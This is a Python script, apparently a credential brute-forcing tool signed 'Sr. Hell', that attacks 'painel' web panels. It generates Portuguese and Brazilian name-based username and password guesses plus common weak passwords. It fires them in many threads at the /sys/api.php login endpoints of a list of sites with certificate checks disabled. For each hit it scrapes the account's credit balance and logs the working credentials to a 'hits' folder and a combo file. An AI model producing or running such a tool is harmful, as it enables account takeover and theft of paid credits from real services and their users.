import requests
import re
import sys
import logging
import os
import threading
import time
import queue
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style
from faker import Faker
import random

# Global configurations
THREADS_PER_SITE = 10
SIMULTANEOUS_SITES = 80
BATCH_SIZE = 1000  # Number of logins to generate at once

# SSL Configuration
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

# Initialize Faker instances
faker_pt = Faker('pt_PT')
faker_br = Faker('pt_BR')

class LoginGenerator:
    def __init__(self):
        self.used_combinations = set()

    def gerar_senha_com_ano(self, nome, ano, maiuscula=True):
        if maiuscula:
            return f"{nome.capitalize()}{ano}"
        return f"{nome.lower()}{ano}"

    def generate_login_batch(self, batch_size):
        logins = []
        while len(logins) < batch_size:
            while True:
                nome = random.choice([faker_pt.first_name(), faker_br.first_name()])
                if len(nome.split()[0]) >= 6:
                    nome = nome.split()[0]
                    break

            numero = random.randint(0, 99)
            usuario = f"{nome}{numero:02d}"
            
            # Generate combinations with years
            anos = [2022, 2023, 2024]
            for ano in anos:
                usuario_ano = f"{nome}{ano}"
                senha_maiuscula = self.gerar_senha_com_ano(nome, ano, True)
                senha_minuscula = self.gerar_senha_com_ano(nome, ano, False)
                
                combinations = [
                    (usuario_ano, senha_minuscula),
                    (usuario_ano, senha_maiuscula)
                ]
                
                for combo in combinations:
                    if combo not in self.used_combinations and len(logins) < batch_size:
                        self.used_combinations.add(combo)
                        logins.append(combo)

            # Generate additional password combinations
            senhas = [
                f"{numero:02d}{nome.capitalize()}",
                f"{nome.capitalize()}{numero:02d}",
                "102030",
                "10203040",
                "112233",
                f"{nome.capitalize()}{numero:02d}",
                f"{nome.capitalize()}123",
                "123456789",
                f"{numero:02d}{nome.capitalize()}",
                f"{nome.capitalize()}"
            ]

            for senha in senhas:
                combo = (usuario, senha)
                if combo not in self.used_combinations and len(logins) < batch_size:
                    self.used_combinations.add(combo)
                    logins.append(combo)

        return logins

class LoginChecker:
    def __init__(self):
        self.login_generator = LoginGenerator()
        
    def login(self, nhost, user, password):
        url = f"https://{nhost}/sys/api.php"
        payload = {
            "action": "login",
            "username": user,
            "password": password
        }
        try:
            response = requests.post(url, data=payload, verify=False, timeout=10)
            if response.ok and "success\":true" in response.text:
                return response.cookies.get("PHPSESSID")
        except:
            pass
        return None

    def get_dashboard_data(self, nhost, cookies):
        try:
            response = requests.get(
                f"https://{nhost}/dashboard",
                cookies={"PHPSESSID": cookies},
                verify=False,
                timeout=10
            )
            return response.text if response.ok else None
        except:
            return None

    def save_valid_login(self, nhost, user, password, credits):
        base_path = "/content/drive/MyDrive/_Paineis/hits"
        os.makedirs(base_path, exist_ok=True)

        with open(f"{base_path}/Sr.Hell@{nhost}.txt", "a") as f:
            f.write(f"\n╼╾ Sr. Hell ╼╾\n")
            f.write(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n")
            f.write(f"𝐔𝐒𝐄𝐑: {user}\n")
            f.write(f"𝐏𝐀𝐒𝐒: {password}\n")
            f.write(f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾\n")
            f.write(f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}\n")
            f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
            f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")

        with open(f"{base_path}/Sr.Hell@COMBO(U&P).txt", "a") as f:
            f.write(f"{user}:{password}\n")

    def print_valid_login(self, nhost, user, password, credits):
        print(f"{Fore.GREEN}\n╼╾ Sr. Hell ╼╾")
        print(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾")
        print(f"𝐒𝐈𝐓𝐄: {nhost}")
        print(f"𝐔𝐒𝐄𝐑: {user}")
        print(f"𝐏𝐀𝐒𝐒: {password}")
        print(f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾")
        print(f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}")
        print(f"╼╼╼╼╼╼╼╼╼╼╼")
        print(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾{Style.RESET_ALL}")

    def check_login(self, nhost, user, password):
        cookies = self.login(nhost, user, password)
        if cookies:
            dashboard_data = self.get_dashboard_data(nhost, cookies)
            if dashboard_data:
                credits_match = re.search(r'badge-info credits_badge\">Créditos: (\d+)', dashboard_data)
                credits = credits_match.group(1) if credits_match else "N/A"
                
                self.save_valid_login(nhost, user, password, credits)
                self.print_valid_login(nhost, user, password, credits)
                return True
        return False

def worker(login_queue, nhost, checker):
    while True:
        try:
            user, password = login_queue.get_nowait()
            checker.check_login(nhost, user, password)
        except queue.Empty:
            break
        finally:
            login_queue.task_done()

def process_site(nhost, login_generator, checker):
    print(f"{Fore.CYAN}Iniciando verificação do site: {nhost}")
    
    while True:
        login_queue = queue.Queue()
        login_batch = login_generator.generate_login_batch(BATCH_SIZE)
        
        for login in login_batch:
            login_queue.put(login)

        threads = []
        for _ in range(THREADS_PER_SITE):
            t = threading.Thread(target=worker, args=(login_queue, nhost, checker))
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

def main():
    ascii_art = """\033[93m
   _  _____  ___   _  ________     __  ___  __
  / |/ / _ \/ _ | / |/ / __/ /    / / / / |/ /
 /    / ___/ __ |/    / _// /__  / /_/ /    / 
/_/|_/_/  /_/ |_/_/|_/___/____/  \____/_/|_/  
    """
    print(ascii_art)

    try:
        with open("/content/drive/MyDrive/_Paineis/site.txt", "r") as f:
            sites = [site.strip() for site in f.readlines() if site.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Arquivo site.txt não encontrado!")
        return

    if not sites:
        print(f"{Fore.RED}Nenhum site encontrado para verificar!")
        return

    print(f"{Fore.CYAN}Sites a serem verificados: {len(sites)}")
    print(f"{Fore.CYAN}Threads por site: {THREADS_PER_SITE}")
    print(f"{Fore.CYAN}Sites simultâneos: {SIMULTANEOUS_SITES}")
    print(f"{Fore.CYAN}Tamanho do lote de logins: {BATCH_SIZE}")

    login_generator = LoginGenerator()
    checker = LoginChecker()

    site_threads = []
    for site in sites:
        t = threading.Thread(target=process_site, args=(site, login_generator, checker))
        t.daemon = True
        t.start()
        site_threads.append(t)
        
        if len(site_threads) >= SIMULTANEOUS_SITES:
            for thread in site_threads:
                thread.join()
            site_threads = []

    for thread in site_threads:
        thread.join()

if __name__ == "__main__":
    main()
